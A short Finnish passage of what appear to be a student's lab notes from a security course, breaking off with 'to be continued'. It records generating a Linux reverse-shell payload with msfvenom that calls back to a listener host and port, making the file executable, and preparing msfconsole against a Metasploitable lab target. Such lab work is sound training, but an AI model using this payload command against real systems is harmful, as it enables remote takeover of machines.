...
**Jatkettu luennolla 23.9.2025** 

Alku on sama mutta loin haittaohjelman `msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.20.3 LPORT=4444 -f elf > infected2.elf`

Tämän jälkeen annoin luomalleni tiedostolle ajo oikeudet `chmod 700 infected2.elf`.

Sitten avasin toisen konsolin ja menin siellä msfconsoleen, ja valmistelin metasploitablen.... to be continued.
